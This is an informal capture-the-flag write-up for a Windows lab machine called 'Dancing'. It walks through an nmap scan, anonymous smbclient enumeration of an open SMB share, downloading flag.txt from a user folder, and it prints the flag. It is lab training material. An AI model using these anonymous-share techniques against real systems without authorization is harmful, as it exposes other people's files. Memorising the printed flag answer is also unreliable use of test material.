## Machine:
**OS:** Windows
**Machine:** Dancing

---

## 1. Reconnaissance

Run nmap
```
❯ nmap -sV -sC 10.129.44.248
Starting Nmap 7.992 ( https://nmap.org ) at 2026-11-01 18:17 +0530
Nmap scan report for 10.129.44.248
Host is up (0.25s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
445/tcp  open  microsoft-ds?
|_rpc-grind: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: ERROR: Script execution failed (use -d to debug)
|_hnap-info: ERROR: Script execution failed (use -d to debug)
|_http-trane-info: ERROR: Script execution failed (use -d to debug)
|_https-redirect: ERROR: Script execution failed (use -d to debug)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
|_vmware-version: ERROR: Script execution failed (use -d to debug)
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-11-01T16:48:46
|_  start_date: N/A
|_clock-skew: 3h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.52 seconds
```
port 135/tcp, 139/tcp, 445/tcp, and 5985/tcp are open
445 is the one running microsoft-ds which is associated with smb

---

## 2. Enumeration

checking for available shares
```
❯ smbclient -L //10.129.44.248/ -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```
found 4 shares, WorkShares being the tasty looking one :d

---

## 3. Exploitation

Attempt to connect to WorkShares using smbclient
```
❯ smbclient -L //10.129.44.248/ -N
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
❯ smbclient //10.129.44.248/WorkShares -N
Can't load /etc/samba/smb.conf - run testparm to debug it
Try "help" to get a list of possible commands.
smb: \> help
?              allinfo        altname        archive        backup         
blocksize      cancel         case_sensitive cd             chmod          
chown          close          del            deltree        dir            
du             echo           exit           get            getfacl        
geteas         hardlink       help           history        iosize         
lcd            link           lock           lowercase      ls             
l              mask           md             mget           mkdir          
mkfifo         more           mput           newer          notify         
open           posix          posix_encrypt  posix_open     posix_mkdir    
posix_rmdir    posix_unlink   posix_whoami   print          prompt         
put            pwd            q              queue          quit           
readlink       rd             recurse        reget          rename         
reput          rm             rmdir          showacls       setea          
setmode        scopy          stat           symlink        tar            
tarmode        timeout        translate      unlock         volume         
vuid           wdel           logon          listconnect    showconnect    
tcon           tdis           tid            utimes         logoff         
..             !              
smb: \> ls
  .                                   D        0  Mon Mar 29 13:52:01 2021
  ..                                  D        0  Mon Mar 29 13:52:01 2021
  Amy.J                               D        0  Mon Mar 29 14:38:24 2021
  James.P                             D        0  Thu Jun  3 14:08:03 2021
ls /
		5114111 blocks of size 4096. 1752975 blocks available
smb: \> ls /Amy.J/
  .                                   D        0  Mon Mar 29 14:38:24 2021
  ..                                  D        0  Mon Mar 29 14:38:24 2021
  worknotes.txt                       A       94  Fri Mar 26 16:30:37 2021

		5114111 blocks of size 4096. 1752959 blocks available
smb: \> ls /James.P/
  .                                   D        0  Thu Jun  3 14:08:03 2021
  ..                                  D        0  Thu Jun  3 14:08:03 2021
  flag.txt                            A       32  Mon Mar 29 14:56:57 2021

		5114111 blocks of size 4096. 1752906 blocks available
smb: \> cd /James.P
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 14:08:03 2021
  ..                                  D        0  Thu Jun  3 14:08:03 2021
  flag.txt                            A       32  Mon Mar 29 14:56:57 2021

		5114111 blocks of size 4096. 1752890 blocks available
smb: \James.P\> get flag.txt
getting file \James.P\flag.txt of size 32 as flag.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
got the flag, saved to my home directory lul
now we get it
```
❯ cat ./flag.txt 
5f61c10dffbc77a704d76016a22f1664⏎  
```
yay

---

## 4. Flag

```
5f61c10dffbc77a704d76016a22f1664
```

## Proof:
![[dancingproof.jpg]]

`PS: i gots no idea why there's sm noise in my commands, especially nmap :/